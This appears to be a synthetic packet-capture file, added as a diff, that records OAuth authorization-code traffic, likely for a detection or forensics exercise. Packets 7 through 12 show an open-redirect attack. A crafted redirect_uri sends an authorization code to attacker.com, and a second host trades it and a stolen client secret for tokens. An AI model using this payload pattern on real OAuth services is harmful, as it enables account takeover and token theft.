@@ -1,0 +1,212 @@
+=== PACKET #1 ===
+Timestamp: 2024-01-15 09:23:14.102
+Source IP: 192.168.1.45
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=random_state_1a2b3c&scope=read_profile HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9
+Connection: keep-alive
+
+=== PACKET #2 ===
+Timestamp: 2024-01-15 09:23:14.345
+Source IP: 10.0.0.10
+Destination IP: 192.168.1.45
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid123&state=random_state_1a2b3c
+Set-Cookie: session_id=sess_abc123; HttpOnly; Secure
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #3 ===
+Timestamp: 2024-01-15 09:24:31.567
+Source IP: 172.16.0.22
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=state_7x8y9z&scope=read_profile HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #4 ===
+Timestamp: 2024-01-15 09:24:31.789
+Source IP: 10.0.0.10
+Destination IP: 172.16.0.22
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid456&state=state_7x8y9z
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #5 ===
+Timestamp: 2024-01-15 10:15:42.223
+Source IP: 192.168.1.78
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=secure_state_abc&scope=read_profile%20write_data HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml
+Connection: keep-alive
+
+=== PACKET #6 ===
+Timestamp: 2024-01-15 10:15:42.456
+Source IP: 10.0.0.10
+Destination IP: 192.168.1.78
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid789&state=secure_state_abc
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #7 ===
+Timestamp: 2024-01-15 11:42:18.891
+Source IP: 203.0.113.50
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback%3Fredirect%3Dhttps%3A%2F%2Fattacker.com%2Fsteal&response_type=code&state=malicious_state_xyz&scope=read_profile HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #8 ===
+Timestamp: 2024-01-15 11:42:19.124
+Source IP: 10.0.0.10
+Destination IP: 203.0.113.50
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?redirect=https://attacker.com/steal&code=AUTH_CODE_xyz789abc456def&state=malicious_state_xyz
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #9 ===
+Timestamp: 2024-01-15 11:42:19.567
+Source IP: 203.0.113.50
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/callback?redirect=https://attacker.com/steal&code=AUTH_CODE_xyz789abc456def&state=malicious_state_xyz HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #10 ===
+Timestamp: 2024-01-15 11:42:20.234
+Source IP: 10.0.0.10
+Destination IP: 203.0.113.50
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://attacker.com/steal?code=AUTH_CODE_xyz789abc456def&state=malicious_state_xyz
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #11 ===
+Timestamp: 2024-01-15 11:42:25.678
+Source IP: 185.220.101.45
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+POST /oauth/token HTTP/1.1
+Host: oauth.example.com
+User-Agent: python-requests/2.28.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 156
+Connection: keep-alive
+
+grant_type=authorization_code&code=AUTH_CODE_xyz789abc456def&client_id=webapp_client_001&client_secret=stolen_secret_123&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback
+
+=== PACKET #12 ===
+Timestamp: 2024-01-15 11:42:25.891
+Source IP: 10.0.0.10
+Destination IP: 185.220.101.45
+Protocol: HTTP
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 342
+Connection: keep-alive
+
+{"access_token":"ACCESS_TOKEN_compromised_xyz","token_type":"Bearer","expires_in":3600,"refresh_token":"REFRESH_TOKEN_stolen_abc","scope":"read_profile"}
+
+=== PACKET #13 ===
+Timestamp: 2024-01-15 12:18:45.123
+Source IP: 192.168.1.99
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=normal_state_def&scope=read_profile HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #14 ===
+Timestamp: 2024-01-15 12:18:45.345
+Source IP: 10.0.0.10
+Destination IP: 192.168.1.99
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid321&state=normal_state_def
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #15 ===
+Timestamp: 2024-01-15 13:05:22.456
+Source IP: 172.16.0.33
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=state_ghi789&scope=read_profile HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #16 ===
+Timestamp: 2024-01-15 13:05:22.678
+Source IP: 10.0.0.10
+Destination IP: 172.16.0.33
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid654&state=state_ghi789
+Content-Length: 0
+Connection: keep-alive
+
+=== PACKET #17 ===
+Timestamp: 2024-01-15 14:30:11.234
+Source IP: 192.168.1.105
+Destination IP: 10.0.0.10
+Protocol: HTTP
+
+GET /oauth/authorize?client_id=webapp_client_001&redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback&response_type=code&state=legitimate_flow_jkl&scope=read_profile%20write_data HTTP/1.1
+Host: oauth.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+=== PACKET #18 ===
+Timestamp: 2024-01-15 14:30:11.456
+Source IP: 10.0.0.10
+Destination IP: 192.168.1.105
+Protocol: HTTP
+
+HTTP/1.1 302 Found
+Location: https://app.example.com/oauth/callback?code=AUTH_CODE_valid987&state=legitimate_flow_jkl
+Content-Length: 0
+Connection: keep-alive
